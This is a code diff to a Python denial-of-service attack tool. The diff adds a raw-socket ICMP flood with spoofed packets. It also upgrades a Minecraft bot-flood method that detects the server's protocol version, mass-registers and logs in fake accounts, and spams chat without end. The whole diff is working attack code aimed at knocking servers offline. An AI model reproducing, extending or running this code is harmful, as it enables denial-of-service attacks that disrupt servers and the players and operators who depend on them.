@@ -11,7 +11,7 @@ from os import urandom as randbytes
 from pathlib import Path
 from re import compile
 from secrets import choice as randchoice
-from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM,
+from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
@@ -31,10 +31,11 @@ from certifi import where
 from cloudscraper import create_scraper
 from dns import resolver
 from icmplib import ping
-from impacket.ImpactPacket import IP, TCP, UDP, Data
+from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
+from hashlib import md5
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -90,7 +91,8 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                 "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
-                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE"
+                                "MCBOT", "CONNECTION", "CPS", "FIVEM",
+                                "TS3", "MCPE", "ICMP"
                                 }
 
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
@@ -128,6 +130,7 @@ BYTES_SEND = Counter()
 
 class Tools:
     IP = compile("(?:\d{1,3}\.){3}\d{1,3}")
+    protocolRex = compile('"protocol":(\d+)')
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -160,10 +163,6 @@ class Tools:
         size += len('\r\n'.join(f'{key}: {value}'
                                 for key, value in res.request.headers.items()))
         return size
-
-    @staticmethod
-    def randchr(lengh: int) -> str:
-        return str(ProxyTools.Random.rand_char(lengh)).strip()
 
     @staticmethod
     def send(sock: socket, packet: bytes):
@@ -267,6 +266,10 @@ class Minecraft:
         return data_pack('>H', integer)
 
     @staticmethod
+    def long(integer: int) -> bytes:
+        return data_pack('>q', integer)
+
+    @staticmethod
     def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
         return Minecraft.data(Minecraft.varint(0x00),
                               Minecraft.varint(version),
@@ -289,20 +292,41 @@ class Minecraft:
                               Minecraft.varint(state))
 
     @staticmethod
-    def login(username: str) -> bytes:
+    def login(protocol: int, username: str) -> bytes:
         if isinstance(username, str):
             username = username.encode()
-        return Minecraft.data(Minecraft.varint(0x00),
+        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
+                                               0x01 if protocol >= 385 else \
+                                               0x00),
                               Minecraft.data(username))
 
     @staticmethod
-    def keepalive(num_id: int) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x00),
+    def keepalive(protocol: int, num_id: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
+                                               0x10 if protocol >= 712 else \
+                                               0x0F if protocol >= 471 else \
+                                               0x10 if protocol >= 464 else \
+                                               0x0E if protocol >= 389 else \
+                                               0x0C if protocol >= 386 else \
+                                               0x0B if protocol >= 345 else \
+                                               0x0A if protocol >= 343 else \
+                                               0x0B if protocol >= 336 else \
+                                               0x0C if protocol >= 318 else \
+                                               0x0B if protocol >= 107 else \
+                                               0x00),
+                              Minecraft.long(num_id) if protocol >= 339 else \
                               Minecraft.varint(num_id))
 
     @staticmethod
-    def chat(message: str) -> bytes:
-        return Minecraft.data(Minecraft.varint(0x01),
+    def chat(protocol: int, message: str) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
+                                               0x03 if protocol >= 464 else \
+                                               0x02 if protocol >= 389 else \
+                                               0x01 if protocol >= 343 else \
+                                               0x02 if protocol >= 336 else \
+                                               0x03 if protocol >= 318 else \
+                                               0x02 if protocol >= 107 else \
+                                               0x01),
                               Minecraft.data(message.encode()))
 
 
@@ -320,11 +344,13 @@ class Layer4(Thread):
                  ref: List[str] = None,
                  method: str = "TCP",
                  synevent: Event = None,
-                 proxies: Set[Proxy] = None):
+                 proxies: Set[Proxy] = None,
+                 protocolid: int = 74):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
         self._ref = ref
+        self.protocolid = protocolid
         self._method = method
         self._target = target
         self._synevent = synevent
@@ -359,10 +385,15 @@ class Layer4(Thread):
         if name == "TS3": self.SENT_FLOOD = self.TS3
         if name == "MCPE": self.SENT_FLOOD = self.MCPE
         if name == "FIVEM": self.SENT_FLOOD = self.FIVEM
+        if name == "ICMP":
+            self.SENT_FLOOD = self.ICMP
+            self._target = (self._target[0], 0)
+
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
         if name == "CPS": self.SENT_FLOOD = self.CPS
         if name == "CONNECTION": self.SENT_FLOOD = self.CONNECTION
         if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
+
         if name == "RDP":
             self._amp_payload = (
                 b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
@@ -408,7 +439,7 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def MINECRAFT(self) -> None:
-        handshake = Minecraft.handshake(self._target, 74, 1)
+        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
         ping = Minecraft.data(b'\x00')
 
         s = None
@@ -444,6 +475,15 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
+    def ICMP(self) -> None:
+        payload = self._genrate_icmp()
+        s = None
+        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
+            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            while Tools.sendto(s, payload, self._target):
+                continue
+        Tools.safe_close(s)
+
     def SYN(self) -> None:
         payload = self._genrate_syn()
         s = None
@@ -464,22 +504,25 @@ class Layer4(Thread):
 
     def MCBOT(self) -> None:
         s = None
+
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
-                                                        47,
+                                                        self.protocolid,
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
                                                         uuid4()))
-            Tools.send(s, Minecraft.login(f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"))
+            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
+            password = md5(username.encode()).hexdigest()[:8].title()
+            Tools.send(s, Minecraft.login(self.protocolid, username))
+            
             sleep(1.5)
 
-            c = 360
-            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999))):
-                c -= 1
-                if c:
-                    continue
-                c = 360
-                Tools.send(s, Minecraft.chat(Tools.randchr(100)))
+            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
+            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
+
+            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
+                sleep(1.1)
+
         Tools.safe_close(s)
 
     def VSE(self) -> None:
@@ -524,9 +567,20 @@ class Layer4(Thread):
         ip.set_ip_dst(self._target[0])
         tcp: TCP = TCP()
         tcp.set_SYN()
+        tcp.set_th_flags(0x02)
         tcp.set_th_dport(self._target[1])
         tcp.set_th_sport(ProxyTools.Random.rand_int(1, 65535))
         ip.contains(tcp)
+        return ip.get_packet()
+
+    def _genrate_icmp(self) -> bytes:
+        ip: IP = IP()
+        ip.set_ip_src(__ip__)
+        ip.set_ip_dst(self._target[0])
+        icmp: ICMP = ICMP()
+        icmp.set_icmp_type(icmp.ICMP_ECHO)
+        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
+        ip.contains(icmp)
         return ip.get_packet()
 
     def _generate_amp(self):
@@ -1561,7 +1615,7 @@ if __name__ == '__main__':
                 if port > 65535 or port < 1:
                     exit("Invalid Port [Min: 1 / Max: 65535] ")
 
-                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
+                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                         not ToolsConsole.checkRawSocket():
                     exit("Cannot Create Raw Socket")
 
@@ -1578,7 +1632,7 @@ if __name__ == '__main__':
                     logger.warning("Port Not Selected, Set To Default: 80")
                     port = 80
 
-                if method == "SYN":
+                if method in {"SYN", "ICMP"}:
                     __ip__ = __ip__
 
                 if len(argv) >= 6:
@@ -1605,9 +1659,23 @@ if __name__ == '__main__':
 
                         else:
                             logger.setLevel("DEBUG")
+                
+                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+                
+                if method == "MCBOT":
+                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
+                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
+                        Tools.send(s, Minecraft.data(b'\x00'))
+
+                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
+                        protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
+                        
+                        if 47 < protocolid > 758:
+                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
+
                 for _ in range(threads):
                     Layer4((target, port), ref, method, event,
-                           proxies).start()
+                           proxies, protocolid).start()
 
             logger.info(
                 f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
